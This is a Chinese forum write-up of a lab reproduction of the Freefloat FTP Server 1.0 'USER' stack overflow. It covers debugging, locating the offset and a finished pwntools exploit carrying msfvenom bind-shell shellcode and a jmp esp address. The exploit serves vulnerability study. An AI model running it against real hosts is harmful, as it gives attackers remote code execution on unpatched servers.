> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-266641.htm)

Freefloat FTP Server1.0 栈溢出漏洞分析
===============================

[](#一、漏洞信息)一、漏洞信息
-----------------

### 1. 漏洞简述

*   漏洞名称：Freefloat FTP server – ‘USER’ Remote Buffer Overflow
*   漏洞编号：EDB-ID 23243
*   漏洞类型：栈溢出
*   漏洞影响：远程代码执行
*   利用难度：Esay

### 2. 组件概述

freefloatftpserver1.0 用于打开 ftp 服务，用于上传文件和管理有线及无线设备的软件

### 3. 漏洞影响

freefloatftpserver1.0

[](#二、漏洞复现)二、漏洞复现
-----------------

### 1. 环境搭建

*   靶机环境：Windows xp sp3
*   靶机配置：
    *   freefloatftpserver1.0
    *   Immunity Debugger
    *   Mona
*   攻击机：kali 2.0
*   攻击机配置
    *   ­ Pwntools
    *   ­ Metasploit

### 2. 复现过程

使用两种工具 Infigo FTPStress Fuzzer 和 Metasploit 都能测试出溢出漏洞存在

#### 2.1 使用 Infigo FTPStress Fuzzer 触发漏洞

##### 2.1.1 在 windowsXP 运行漏洞程序，程序打开 ftp 服务，并监听 21 号端口

![](https://bbs.pediy.com/upload/attach/202103/913279_CVJAW66M8MX7WTP.png)

##### 2.1.2 ftpfuzz 触发漏洞

![](https://bbs.pediy.com/upload/attach/202103/913279_VRC8JAG45QPPCCH.png)

 

![](https://bbs.pediy.com/upload/attach/202103/913279_DHA9THJC94MV2C8.png)

 

eip 指向 fuzz 发送的测试数组‘AAAA‘，程序执行流已被更改，存在溢出漏洞

#### 2.2 使用 metasploit 的 ftp fuzz 进行测试

攻击机 kali 运行 metasploit，运行如下命令

```
#打开metasploit
msfconsole
#查询可用的fuzz
search fuzzing
#使用ftp fuzz模块
use auxiliary/fuzzers/ftp/ftp_pre_post
#设置靶机
set RHOST 192.168.112.146
#漏洞利用
exploit

```

运行结果

 

![](https://bbs.pediy.com/upload/attach/202103/913279_6CUVSEPPZ6SVGM7.png)  
![](https://bbs.pediy.com/upload/attach/202103/913279_35NFXTKNQ758UJP.png)

 

靶机崩溃，eip 指向未知内存地址，可以溢出

[](#三、漏洞分析)三、漏洞分析
-----------------

### 1. 背景知识

最简单的栈溢出，jmp esp 作为跳板跳转到栈中执行

### 2. 详细分析

#### 2.1 Immunity Debugger 调试

在靶机用 Immunity Debugger 打开 freefloatftpserver1.0 运行调试

 

![](https://bbs.pediy.com/upload/attach/202103/913279_K2524ANMUK6S5DT.png)

#### 2.2 python 发包测试

在 kali 攻击机用 pwntools 编写脚本，向 ftp 服务器的 USER 输入点发送数据包测试

```
from pwn import *
p = remote("192.168.112.146", 21)
paylad = 'A'*500
p.sendline(payload)
p.interactive()

```

程序崩溃，eip 指向 0x41414141，由发送的数据 A 的 ascii 码为 0x41 可知，USER 输入点存在溢出漏洞

 

![](https://bbs.pediy.com/upload/attach/202103/913279_3UDC4R7RMRA4RJV.png)

#### 2.3 定位溢出点

输入用户名之前，程序会输出一条 ftp 服务器版本的语句，在 immunity debugger 中定位输出这句话的函数，从而缩小定位漏洞函数的范围

 

![](https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/8.png?raw=true)

 

查询字符串

 

![](https://bbs.pediy.com/upload/attach/202103/913279_G3HGGC2DTCUPZVQ.png)

 

在 wsprintw 函数设置断点

 

![](https://bbs.pediy.com/upload/attach/202103/913279_V44Y9XW5PB7METE.png)

 

重新发送 payload，单步调试，直到运行到出现异常的函数 freefloa.004020E0

 

![](https://bbs.pediy.com/upload/attach/202103/913279_4U8VYJJEFZQSTD4.png)

 

在 freefloa.004020E0 函数设置断点，重新发送 payload，f7 单步步入此函数

 

![](https://bbs.pediy.com/upload/attach/202103/913279_CDNNGAAZ3SYSX6U.png)

 

重复上述操作，接着在 freefloa.00402190 函数设置断点，单步步入，程序会在运行到 00402881 处跳转到 004028EB 处执行，之后调用 freefloa.00402DE0 函数，程序崩溃

 

![](https://bbs.pediy.com/upload/attach/202103/913279_32QJJFMY5D23QBN.png)

 

在 freefloa.00402DE0 函数设置断点，步入之后未发现存在子函数，并且在返回的时候执行 retn 8 指令

 

![](https://bbs.pediy.com/upload/attach/202103/913279_8JC82GUXNFT3S5K.png)

 

观察此时 esp 指向的返回地址为 0x41414141，执行 retn 命令之后 eip 指向 0x41414141，使得程序崩溃

 

![](https://bbs.pediy.com/upload/attach/202103/913279_PVPPGR6NTZKPKZW.png)

 

得出结论：freefloa.00402DE0 函数可能出现栈溢出

#### 2.4 静态分析结合动态分析

用 IDA 加载程序进行静态分析，定位到函数 sub_00402DE0

 

![](https://bbs.pediy.com/upload/attach/202103/913279_6EJ2V35RRBFJ7RG.png)

 

Strcpy 函数存在溢出漏洞，将函数第三个参数 a3 的值复制到局部变量 v8 中，如果 a3 过长，会覆盖返回地址，那 sub_00402DE0 函数的参数 a2，a3 到底是什么？这就回溯到调用此函数的位置了，通过之前动态分析可以得到调用函数为 00402190，IDA 静态分析分析得 Sub_00402190 将输入的字符串与各种 ftp 命令进行比较，根据命令进行不同的响应。

 

用 immunity debugger 回溯到 sub_00402190 函数里的 00402881 地址，这个地址的指令跳转执行漏洞函数 00402DE0，查看栈帧能够获得参数

 

![](https://bbs.pediy.com/upload/attach/202103/913279_5Z7P6TMJQ9QAGN4.png)

 

在 IDA 中定位，aXommandNotUnde 就是上图的 command not understood 字符串，此处跳转执行 402DE0

 

![](https://bbs.pediy.com/upload/attach/202103/913279_DEKMFUXV65TMHR8.png)

 

![](https://bbs.pediy.com/upload/attach/202103/913279_QSFX3USVDWSW9JX.png)

 

参数 1 V16 是输入字符串长度，参数 2 v17 是输入字符串‘AAAA‘:command not understood’ 查看函数栈帧可验证

 

![](https://bbs.pediy.com/upload/attach/202103/913279_ACARWTME9YM6TU7.png)

 

结论：函数 sub_402DE0 栈帧结构，（ebp 实际不存在，只是方便记录相对偏移）

 

![](https://bbs.pediy.com/upload/attach/202103/913279_RB83VMN5PDER5JC.png)

 

只需填充 0xFC-1 个垃圾数据可溢出到函数返回地址（-1 是因为程序在输入字符串前添加了单引号），重新组织 poc，返回地址为 cccc

```
from pwn import *
p = remote("192.168.112.146", 21)
payload = 'A'*(0xfc-1) + 'cccc'
p.sendline(payload)
p.interactive()

```

返回地址为 0x63636363，是 cccc 的 ascii 码，验证成功

 

![](https://bbs.pediy.com/upload/attach/202103/913279_VETZCUJB797UMES.png)

### 4. 漏洞利用

#### 1. 利用条件

Windows xp sp3 未开启 DEP 保护

#### 2. 利用过程

##### 1. 排除坏字符

在生成 shellcode 之前需要确定坏字符，用 mona 生成一个 0x00 到 0xff 的 bytearray，发送 payload，比对哪个字符发送后会破坏 payload，将其排除即可

```
from pwn import *
p = remote('192.168.112.146',21)
bytearray = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
payload = 'a'*(0xfc-1) + 'cccc' + bytearray
p.sendline(payload)
p.interactive()

```

##### 2. 生成 shellcode

利用 metasploit 生成 windows 反弹 shell 的 shellcode，排除坏数据’\x00\x0a\x0d’，以 c 语言格式输出，靶机 IP192.168.112.146

 

`msfvenom -p windows/shell_bind_tcp LHOSTS=192.168.112.146 LPORT=4444 -b '\x00\x0a\x0d' -f c`

 

![](https://bbs.pediy.com/upload/attach/202103/913279_8Y6SWY9SPWCYS44.png)

##### 3. 内存中查找 jmp esp 命令

使用 mona 插件查询 jmp esp 指令的地址

```
!mona jmp -r esp
#或者
!mona find -s "\xff\xe4" -m

```

![](https://bbs.pediy.com/upload/attach/202103/913279_V42NSNHHZEWXH7E.png)

 

从中选择一个地址 0x77D29353，作为跳板，跳转到栈上执行 shellcode

 

![](https://bbs.pediy.com/upload/attach/202103/913279_7RH33Y5S8FVMAAN.png)

 

最终 Exploit.py

```
from pwn import *
 
p = remote('192.168.112.146',21)
 
shellcode = (
"\xbf\xb9\x9b\xb3\x2f\xdb\xd2\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x53\x31\x78\x12\x83\xc0\x04\x03\xc1\x95\x51\xda\xcd\x42\x17"
"\x25\x2d\x93\x78\xaf\xc8\xa2\xb8\xcb\x99\x95\x08\x9f\xcf\x19"
"\xe2\xcd\xfb\xaa\x86\xd9\x0c\x1a\x2c\x3c\x23\x9b\x1d\x7c\x22"
"\x1f\x5c\x51\x84\x1e\xaf\xa4\xc5\x67\xd2\x45\x97\x30\x98\xf8"
"\x07\x34\xd4\xc0\xac\x06\xf8\x40\x51\xde\xfb\x61\xc4\x54\xa2"
"\xa1\xe7\xb9\xde\xeb\xff\xde\xdb\xa2\x74\x14\x97\x34\x5c\x64"
"\x58\x9a\xa1\x48\xab\xe2\xe6\x6f\x54\x91\x1e\x8c\xe9\xa2\xe5"
"\xee\x35\x26\xfd\x49\xbd\x90\xd9\x68\x12\x46\xaa\x67\xdf\x0c"
"\xf4\x6b\xde\xc1\x8f\x90\x6b\xe4\x5f\x11\x2f\xc3\x7b\x79\xeb"
"\x6a\xda\x27\x5a\x92\x3c\x88\x03\x36\x37\x25\x57\x4b\x1a\x22"
"\x94\x66\xa4\xb2\xb2\xf1\xd7\x80\x1d\xaa\x7f\xa9\xd6\x74\x78"
"\xce\xcc\xc1\x16\x31\xef\x31\x3f\xf6\xbb\x61\x57\xdf\xc3\xe9"
"\xa7\xe0\x11\x87\xaf\x47\xca\xba\x52\x37\xba\x7a\xfc\xd0\xd0"
"\x74\x23\xc0\xda\x5e\x4c\x69\x27\x61\x63\x36\xae\x87\xe9\xd6"
"\xe6\x10\x85\x14\xdd\xa8\x32\x66\x37\x81\xd4\x2f\x51\x16\xdb"
"\xaf\x77\x30\x4b\x24\x94\x84\x6a\x3b\xb1\xac\xfb\xac\x4f\x3d"
"\x4e\x4c\x4f\x14\x38\xed\xc2\xf3\xb8\x78\xff\xab\xef\x2d\x31"
"\xa2\x65\xc0\x68\x1c\x9b\x19\xec\x67\x1f\xc6\xcd\x66\x9e\x8b"
"\x6a\x4d\xb0\x55\x72\xc9\xe4\x09\x25\x87\x52\xec\x9f\x69\x0c"
"\xa6\x4c\x20\xd8\x3f\xbf\xf3\x9e\x3f\xea\x85\x7e\xf1\x43\xd0"
"\x81\x3e\x04\xd4\xfa\x22\xb4\x1b\xd1\xe6\xc4\x51\x7b\x4e\x4d"
"\x3c\xee\xd2\x10\xbf\xc5\x11\x2d\x3c\xef\xe9\xca\x5c\x9a\xec"
"\x97\xda\x77\x9d\x88\x8e\x77\x32\xa8\x9a")
 
# 0x77d29353 -> jmp esp
payload = 'a'*(0xfc-1) + "\x53\x93\xd2\x77" + "\x90"*16 + shellcode
 
p.sendline(payload)
p.interactive()

```

> 注：shellcode 前 16 个 \ x90 是因为函数返回时的 retn 8 需要跳过，也可作为滑板，同时作为缓冲区防止执行 shellcode 时更改内存使得 shellcode 执行代码也被更改

 

执行流程：

 

![](https://bbs.pediy.com/upload/attach/202103/913279_MAXQMK9DHCKAK6M.png)

 

栈帧结构：

 

![](https://bbs.pediy.com/upload/attach/202103/913279_D6MMK55B69RJYDG.png)

 

Shellcode 使靶机开放 4444 端口进行 shell 连接攻击机，连接成功

 

![](https://bbs.pediy.com/upload/attach/202103/913279_HMUFH5R5AQHRY9Y.png)

[](#四、参考文献)四、参考文献
-----------------

*   [https://www.exploit-db.com/exploits/23243](https://www.exploit-db.com/exploits/23243)
*   [https://giantbranch.blog.csdn.net/article/details/53291788](https://giantbranch.blog.csdn.net/article/details/53291788)
*   [https://www.youtube.com/watch?v=i6Br57lh4uE](https://www.youtube.com/watch?v=i6Br57lh4uE)
*   [https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

[[公告] 2021 KCTF 春季赛 防守方征题火热进行中！](https://bbs.pediy.com/thread-266222.htm)

最后于 56 分钟前 被 mb_uvhwamsn 编辑 ，原因：

上传的附件：

*   [freefloatftp 漏洞分析. zip](javascript:void(0)) （1.18MB，0 次下载）